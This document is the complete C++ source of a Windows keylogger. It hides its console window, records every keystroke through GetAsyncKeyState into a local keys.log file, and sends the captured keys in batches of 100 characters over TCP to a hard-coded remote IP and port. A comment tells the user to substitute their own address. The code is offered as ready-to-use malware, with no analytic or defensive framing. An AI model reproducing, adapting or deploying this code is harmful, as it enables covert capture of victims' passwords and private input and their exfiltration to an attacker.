//Remeber change "192.168.1.100" IP and "12345" Port
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void SendKeys(const std::string& keys, const std::string& ipAddress, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    send(sock, keys.c_str(), keys.length(), 0);
    closesocket(sock);
    WSACleanup();
}

int main() {
    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    std::ofstream logFile("keys.log", std::ios::app);
    std::string loggedKeys;

    while (true) {
        Sleep(10); // Reduce CPU usage
        for (int i = 8; i <= 190; i++) { // Check key codes
            if (GetAsyncKeyState(i) == -32767) {
                loggedKeys += char(i);
                logFile << char(i);
                logFile.flush();

                // Send every 100 characters
                if (loggedKeys.length() >= 100) {
                    SendKeys(loggedKeys, "192.168.1.100", 12345); // Replace with target IP and port
                    loggedKeys.clear();
                }
            }
        }
    }

    logFile.close();
    return 0;
}
